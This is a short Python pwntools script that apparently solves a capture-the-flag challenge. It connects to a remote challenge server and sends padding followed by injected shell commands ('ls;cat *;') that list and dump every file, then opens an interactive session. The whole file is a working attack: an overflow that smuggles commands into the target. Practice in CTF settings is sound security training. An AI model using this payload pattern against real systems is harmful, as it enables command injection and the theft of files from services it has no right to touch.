from pwn import *

conn = remote('chal.sigpwny.com', 1353)

conn.recvline()
conn.recvline()

exploit = b'A' * 0x10
exploit += b'ls;cat *;'

conn.sendline(exploit)

conn.interactive()